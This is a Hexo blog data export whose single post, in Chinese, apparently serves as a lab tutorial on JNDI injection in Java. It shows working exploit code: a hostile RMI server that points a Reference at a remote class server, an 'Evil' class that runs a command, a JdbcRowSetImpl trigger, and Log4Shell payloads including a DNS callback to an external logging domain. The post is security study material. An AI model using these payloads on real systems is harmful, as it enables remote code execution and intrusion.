{"meta":{"title":"Hexo","subtitle":"","description":"","author":"r1ngs","url":"https://0xr1ngs.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2023-06-18T07:49:56.844Z","updated":"2023-06-18T07:49:56.844Z","comments":true,"path":"archive.html","permalink":"https://0xr1ngs.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"Jndi注入","slug":"Java-Jndi","date":"2023-06-19T11:21:26.000Z","updated":"2023-06-19T11:40:43.218Z","comments":true,"path":"2023/06/19/Java-Jndi/","link":"","permalink":"https://0xr1ngs.github.io/2023/06/19/Java-Jndi/","excerpt":"","text":"JNDI注入JNDI全称为Java Naming and Directory Interface（Java命名和目录接口），是SUN公司提供的一种标准的Java命名系统接口 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务通常使用树状结构来组织信息，LDAP是典型的目录服务，Active Directory是LDAP在Windows上的实现，OpenLDAP 是在 Linux 上的实现 JNDI_RMI服务端： package org.RmiDemo; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class Server &#123; public static class RMIInstance extends UnicastRemoteObject implements IHello&#123; &#x2F;&#x2F; 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口 &#x2F;&#x2F; 构造方法 protected RMIInstance() throws RemoteException &#123; &#125; &#x2F;&#x2F; 实现接口 @Override public String sayHello(String name) throws RemoteException &#123; return &quot;hello, &quot; + name; &#125; &#125; public static void main(String[] args) throws Exception &#123; LocateRegistry.createRegistry(1099); RMIInstance rmiInstance &#x3D; new RMIInstance(); Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;hello&quot;,rmiInstance); &#125; &#125; 接口： package org.RmiDemo; import java.rmi.Remote; import java.rmi.RemoteException; public interface IHello extends Remote &#123; // 必须抛出java.rmi.RemoteException异常 String sayHello(String name) throws RemoteException; &#125; 客户端： package org.RmiDemo; import javax.naming.Context; import javax.naming.InitialContext; import java.util.Hashtable; public class Client &#123; public static void main(String[] args) throws Exception&#123; // JNDI环境变量 Hashtable&lt;String, String> env = new Hashtable&lt;>(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1\"); // javax.naming.InitialContext上下文 Context initialContext = new InitialContext(env); Object obj = initialContext.lookup(\"hello\"); if (obj instanceof IHello)&#123; IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(\"world\")); &#125; &#125; &#125; 动态协议转换:initialContext.lookup指定的参数可控 package org.RmiDemo; import javax.naming.Context; import javax.naming.InitialContext; public class Client &#123; public static void main(String[] args) throws Exception&#123; // 不指定环境变量 Context initialContext = new InitialContext(); // 通过用户输入来动态识别调用的服务 Object obj = initialContext.lookup(\"rmi://127.0.0.1/hello\"); if (obj instanceof IHello)&#123; IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(\"world\")); &#125; &#125; &#125; 则可以指定一个攻击者的rmi服务，实例化恶意类达成攻击。但是恶意类在服务器端并不存在，也就调用不了方法，因此需要Reference类。如果远程获取RMI服务上的对象为Reference类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。 // Constructs a new reference for an object with class name 'className', and the class name and location of the object's factory. // Params: // className – The non-null class name of the object to which this reference refers. // factory – The possibly null class name of the object's factory. // factoryLocation – The possibly null location from which to load the factory (e.g. URL) public Reference(String className, String factory, String factoryLocation) &#123; this(className); classFactory = factory; classFactoryLocation = factoryLocation; &#125; package org.RmiDemo; import java.rmi.Naming; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; public class Server &#123; public static void main(String[] args) throws Exception &#123; LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"Arbitrary\",\"Evil\",\"&lt;http://127.0.0.1:8888/>\"); // Reference没有继承UnicastRemoteObject，因此需要com.sun.jndi.rmi.registry.ReferenceWrapper进行包装 ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"rmi://127.0.0.1/hello\",refObjWrapper); System.out.println(\"Server Running.\"); &#125; &#125; 在这个例子中，factory是工厂类，会去直接寻找 http://127.0.0.1:8888/Evil.class文件，然后实例化，我们可以直接在工厂类的构造方法中执行代码，或者在静态代码块中执行。因此，className可以是任意的。 Class.forName(name)会执行”类的初始化“，先后调用static、{}、构造函数 import java.io.IOException; public class Evil &#123; public Evil() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125; static &#123; try &#123; Runtime.getRuntime().exec(\"calc\"); &#125; catch (IOException var1) &#123; throw new RuntimeException(var1); &#125; &#125; &#125; 然后用同版本（否则会报 Unsupported major.minor）jdk编译：javac [Evil.java](&lt;http://Evil.java&gt;) ，将其放入 http://127.0.0.1:8888 目录下，运行客户端代码即可弹出两次计算器（虽然会报 Evil cannot be cast to javax.naming.spi.ObjectFactory 但代码还是执行了）。 JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 JdbcRowSetImpl通过JdbcRowSetImpl也能触发： package org.RmiDemo; import com.sun.rowset.JdbcRowSetImpl; public class Client &#123; public static void main(String[] args) throws Exception&#123; System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(\"rmi://127.0.0.1/hello\"); JdbcRowSetImpl_inc.setAutoCommit(true); &#125; &#125; 触发点在setAutoCommit，参数是true还是false没有影响。 实验环境为 jdk 1.8.0_202，由于trustURLCodebase为false，如果不手动开启的话会报错：Exception in thread &quot;main&quot; java.lang.ClassCastException: javax.naming.Reference cannot be cast to javax.sql.DataSource 快速搭建JNDI环境： https://github.com/welk1n/JNDI-Injection-Exploit https://github.com/mbechler/marshalsec 8u191以后可以通过加载本地危险工厂类实现代码执行 https://github.com/veracode-research/rogue-jndi Log4shell可以用Springboot启动一个环境，maven依赖如下配置 &lt;dependencies> &lt;dependency> &lt;groupId>org.springframework.boot&lt;/groupId> &lt;artifactId>spring-boot-starter-web&lt;/artifactId> &lt;exclusions> &lt;!--先排除...--> &lt;exclusion> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-to-slf4j&lt;/artifactId> &lt;/exclusion> &lt;/exclusions> &lt;/dependency> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-api&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-core&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;/dependencies> 可以先测试是否能解析（高版本已经默认关闭解析）： Logger logger = LogManager.getLogger(BasicController.class); logger.error(\"name:&#123;&#125;\", \"$&#123;java:runtime&#125;\"); logger.error(\"name:&#123;&#125;\", \"$&#123;jndi:dns://d4b3766c.ipv6.1433.eu.org&#125;\"); 通过一个简单的controller测试： @Controller public class BasicController &#123; private static final Logger logger = LogManager.getLogger(BasicController.class); // &lt;http://127.0.0.1:8080/hello?name=lisi> @RequestMapping(\"/hello\") @ResponseBody public String hello(@RequestParam(name = \"name\", defaultValue = \"unknown user\") String name) &#123; logger.error(\"name: \" + name); return \"Hello \" + name; &#125; ... //SpringDemoApplication.java System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); SpringApplication.run(SpringDemoApplication.class, args); 访问http://127.0.0.1:8080/hello?name=%24{jndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fcuizgz}即可执行恶意命令。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]}],"categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]}